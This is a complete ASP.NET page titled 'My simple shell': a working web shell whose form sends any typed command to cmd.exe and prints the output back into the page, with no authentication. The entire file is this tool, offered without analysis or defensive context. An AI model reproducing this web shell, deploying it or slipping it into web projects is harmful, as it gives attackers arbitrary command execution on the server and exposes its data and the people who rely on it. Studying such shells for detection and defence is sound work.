<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e){}
string commandFunction(string arg){
    ProcessStartInfo processInfo = new ProcessStartInfo();
    processInfo.FileName = "cmd.exe";
    processInfo.Arguments = "/c "+arg;
    processInfo.RedirectStandardOutput = true;
    processInfo.UseShellExecute = false;
    Process process1 = Process.Start(processInfo);
    StreamReader reader = process1.StandardOutput;
    string stringText = reader.ReadToEnd();
    reader.Close();
    return stringText;
}
void interactionHandlerCommandFunction(object sender, System.EventArgs e){
    Response.Write("<pre>");
    Response.Write(Server.HtmlEncode(commandFunction(commandArgument.Text)));
    Response.Write("</pre>");
}
</script>
<html>
<head><title>My simple shell</title></head>
<body>
    <form id="form" method="post" runat="server">
        <asp:Label id="labelText" style="left: 100px; position:  absolute" runat="server">Command:</asp:Label>
        <asp:TextBox id="commandArgument" style="left: 200px; position:  absolute" runat="server" width="250px"></asp:TextBox>
        <asp:Button id="testing" style="left: 500px; position: absolute" runat="server" Text="Run" OnClick="interactionHandlerCommandFunction"></asp:Button>
    </form>
</body>
</html>